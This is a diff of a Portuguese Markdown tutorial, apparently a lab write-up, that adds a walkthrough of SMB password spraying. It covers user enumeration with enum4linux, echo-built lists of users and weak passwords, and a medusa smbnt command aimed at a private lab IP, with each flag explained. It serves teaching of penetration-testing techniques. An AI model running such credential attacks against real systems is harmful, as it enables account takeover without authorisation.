@@ -133,6 +133,8 @@ Para validar, acesse com as seguintes credenciais de login: admin e senha: passw
 
 O protocolo **SMB** significa *Server Message Block*. É um protocolo do Windows utilizado para compartilhar arquivos, pastas, impressoras e também para realizar a autenticação de usuários e comunicação entre máquinas Windows e Linux via samba. Pode ser considerado uma porta para compartilhar recursos da rede interna.
 
+**1. Listar usuários**
+
 Vamos supor que você descobriu em uma rede um smb ativo. O próximo passo, é **descobrir os usuários existentes no sistema** e **testar senhas fracas** em todos eles discretamente, sem bloquear nenhuma conta.
 
 O **Password Spraying** é uma *técnica furtiva de ataque às senhas*. Ao invés de tentar muitas senhas para um único usuário, o que leva ao bloqueio de tentativas, a gente vai testar **uma senha comum para muitos usuários diferentes**.
@@ -155,4 +157,37 @@ Depois ler o conteúdo com o seguinte comando:
 less enum4_output.txt
 ```
 
-Ele vai criar uma lista com possíveis alvos:
+Ele vai mostrar uma lista com possíveis alvos:
+
+![Varredura Enum](./images/04_varredura_enum.png)
+
+**2. Criação de wordlists**
+
+Comando para criar uma wordlist de usuários, que vai alimentar a ferramenta de ataque:
+
+```bash
+echo -e "user\nmsfadmin\nservice" > smb_users.txt
+```
+
+Comando para criar a password spraying:
+
+```bash
+echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
+```
+
+**3. Efetuando o ataque**
+
+Comando para ataque em cadeia:
+
+```bash
+medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
+```
+
+Explicando os parâmetros:
+- `-h 192.168.56.102`: ip do alvo.
+- `-U smb_users.txt`: lista de usuários descoberta na enumeração.
+- `-P senhas_spray.txt`: lista de senhas fracas.
+- `-M smbnt`: módulo específico para ataques via smb.
+- `-t 2`: uma das duas tags simultâneas, ou seja, vai simular dois usuários testando senhas.
+- `-T 50`: significa até 50 hosts em paralelo.
+
